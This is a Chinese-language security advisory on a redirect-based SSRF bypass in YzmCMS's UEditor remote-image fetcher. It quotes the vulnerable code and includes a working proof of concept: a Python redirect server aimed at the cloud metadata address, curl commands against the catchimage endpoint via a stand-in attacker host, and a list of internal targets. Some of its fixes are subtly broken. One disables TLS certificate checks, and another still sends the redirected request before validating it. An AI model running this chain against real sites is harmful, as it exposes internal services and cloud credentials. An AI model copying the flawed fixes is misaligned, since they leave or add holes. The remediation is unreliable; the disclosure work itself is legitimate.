# YZMCMS-2025-002: UEditor saveRemote() SSRF via HTTP Redirect Bypass

## 基本信息

| 字段 | 值 |
|------|-----|
| **项目** | [yzmcms/yzmcms](https://github.com/yzmcms/yzmcms) |
| **版本** | latest (截至 2026-05-27) |
| **严重性** | Medium |
| **CVSS 3.1** | 5.0 (AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N) |
| **CWE** | CWE-918 (Server-Side Request Forgery) |
| **发现日期** | 2026-05-27 |
| **攻击向量** | 网络/已认证 |

## 漏洞概述

YzmCMS 集成 UEditor 的远程图片抓取功能（`catchimage`）存在 SSRF 绕过漏洞。虽然 `saveRemote()` 对初始 URL 的目标 IP 进行了私有地址检查，但检查之后调用的 `get_headers()` 会**跟随 HTTP 重定向**，导致攻击者可以绕过 IP 限制，使服务器向内网地址发起请求。

具体缺陷链：
1. `saveRemote()` 使用 `gethostbyname()` + `filter_var(FILTER_FLAG_NO_PRIV_RANGE)` 验证初始 URL 的 IP 非私有
2. 验证通过后，调用 PHP `get_headers()` 检查远程链接是否存活
3. `get_headers()` **默认跟随 HTTP 重定向**，不检查重定向目标的 IP
4. 攻击者构造一个公网 URL，返回 302 重定向到内网地址 → 绕过 IP 检查
5. 虽然后续 `readfile()` 设置了 `follow_location => false` 不会下载内网内容，但 `get_headers()` 的请求已发出

## 漏洞代码

**文件**: `common/static/plugin/ueditor/php/Uploader.class.php` (`saveRemote()` 方法)

```php
private function saveRemote()
{
    $imgUrl = htmlspecialchars($this->fileField);
    $imgUrl = str_replace("&amp;", "&", $imgUrl);

    // 步骤1: 验证是 http(s) 开头
    if (strpos($imgUrl, "http") !== 0) {
        $this->stateInfo = $this->getStateInfo("ERROR_HTTP_LINK");
        return;
    }

    // 步骤2: 提取域名并解析 IP
    preg_match('/(^https*:\/\/[^:\/]+)/', $imgUrl, $matches);
    $host_with_protocol = count($matches) > 1 ? $matches[1] : '';
    preg_match('/^https*:\/\/(.+)/', $host_with_protocol, $matches);
    $host_without_protocol = count($matches) > 1 ? $matches[1] : '';
    $ip = gethostbyname($host_without_protocol);

    // 步骤3: 检查 IP 不是私有地址（可被绕过）
    if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE)) {
        $this->stateInfo = $this->getStateInfo("INVALID_IP");
        return;  // ← 仅检查初始 URL 的 IP
    }

    // 步骤4: ⚠️ get_headers() 跟随重定向，绕过了 IP 检查！
    $heads = get_headers($imgUrl, 1);
    if (!(stristr($heads[0], "200") && stristr($heads[0], "OK"))) {
        $this->stateInfo = $this->getStateInfo("ERROR_DEAD_LINK");
        return;
    }

    // 步骤5: readfile 不跟随重定向，但 get_headers 已经发了请求
    $context = stream_context_create(
        array('http' => array(
            'follow_location' => false // ← 这里阻止了重定向
        ))
    );
    readfile($imgUrl, false, $context);
    // ...
}
```

**认证要求**（`yzm_action.php`）:
```php
if(!isset($_SESSION['adminid']) && !isset($_SESSION['_userid'])){
    exit(json_encode(array('state'=> '请登录后再继续操作！')));
}
```
普通会员即可访问此接口，不需要管理员权限。

**入口点**（`action_crawler.php`）:
```php
$fieldName = $CONFIG['catcherFieldName'];  // 默认为 'source'
if (isset($_POST[$fieldName])) {
    $source = $_POST[$fieldName];
} else {
    $source = $_GET[$fieldName];
}
foreach ($source as $imgUrl) {
    $item = new Uploader($imgUrl, $config, "remote");  // 触发 saveRemote()
}
```

## 攻击链 (Proof of Concept)

### 前提条件
1. 在目标 YzmCMS 实例上注册一个普通会员账号
2. 攻击者控制一个公网服务器 `http://attacker.com`

### 步骤1: 搭建恶意重定向服务器

```python
# attacker.py - 在攻击者服务器上运行
from http.server import HTTPServer, BaseHTTPRequestHandler

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # 重定向到内网目标
        self.send_response(302)
        self.send_header('Location', 'http://169.254.169.254/latest/meta-data/')
        self.end_headers()
    
    def do_HEAD(self):
        # get_headers() 发送 HEAD 请求
        self.send_response(302)
        self.send_header('Location', 'http://169.254.169.254/latest/meta-data/')
        self.end_headers()

HTTPServer(('0.0.0.0', 8080), RedirectHandler).serve_forever()
```

### 步骤2: 触发 SSRF

```bash
# 登录获取 session cookie
curl -c cookies.txt -X POST https://target-yzmcms.com/member/index/login \
  -d "username=attacker&password=attacker123"

# 触发 SSRF（通过 catchimage 接口）
curl -b cookies.txt \
  "https://target-yzmcms.com/common/static/plugin/ueditor/php/controller.php?action=catchimage&source[]=http://attacker.com:8080/redirect-to-metadata"
```

### 步骤3: 验证效果

攻击者服务器收到 `get_headers()` 的 HEAD 请求（302 重定向跟随到内部地址），成功使目标服务器向内网发起请求。

### 攻击场景

| 目标内网地址 | 攻击效果 |
|---|---|
| `169.254.169.254/latest/meta-data/` | AWS 元数据探测 |
| `127.0.0.1:6379` | Redis 未授权探测 |
| `127.0.0.1:3306` | MySQL 端口存活检测 |
| `192.168.x.x` | 内网存活主机扫描 |
| 内网 Web 服务 | 内网 API 探测 |

## 影响范围

- 所有开启 `auto_down_imag` 配置的 YzmCMS 实例
- 任何注册了会员账号的攻击者（不需要管理员权限）
- 可探测内网存活主机和服务端口
- 在云环境中可访问实例元数据端点（AWS IMDSv1）

## 修复建议

### 方案1（推荐）：禁用 get_headers 的重定向跟随

```php
// 在 get_headers() 调用中使用 stream context 禁用重定向
$context = stream_context_create(array(
    'http' => array(
        'follow_location' => 0,
        'max_redirects' => 0,
    ),
    'ssl' => array(
        'verify_peer' => false,
        'verify_peer_name' => false,
    ),
));
$heads = get_headers($imgUrl, 1, $context);
```

### 方案2：在 get_headers 之后再次验证 IP

```php
// 解析最终 IP（处理重定向后的真实目标）
$final_headers = get_headers($imgUrl, 1);
// 检查 Location 头中的重定向目标
if (isset($final_headers['Location'])) {
    $redirect_url = $final_headers['Location'];
    $redirect_host = parse_url($redirect_url, PHP_URL_HOST);
    $redirect_ip = gethostbyname($redirect_host);
    if (!filter_var($redirect_ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE)) {
        $this->stateInfo = $this->getStateInfo("INVALID_IP");
        return;
    }
}
```

### 方案3：统一使用 cURL 并禁用重定向

```php
// 完全替换 get_headers() + readfile() 为 cURL
$ch = curl_init($imgUrl);
curl_setopt($ch, CURLOPT_NOBODY, true);         // 先 HEAD 检查
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false); // 禁止重定向
curl_setopt($ch, CURLOPT_TIMEOUT, 5);
curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($http_code != 200) {
    $this->stateInfo = $this->getStateInfo("ERROR_DEAD_LINK");
    return;
}
```

## 时间线

| 日期 | 事件 |
|------|------|
| 2026-05-27 | 通过白盒审计发现漏洞 |
| 待定 | 向 YzmCMS 团队报告 |
| 待定 | 修复发布 |

## 参考

- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
- [PHP: get_headers() 安全注意事项](https://www.php.net/manual/en/function.get-headers.php)
- [OWASP: SSRF](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)
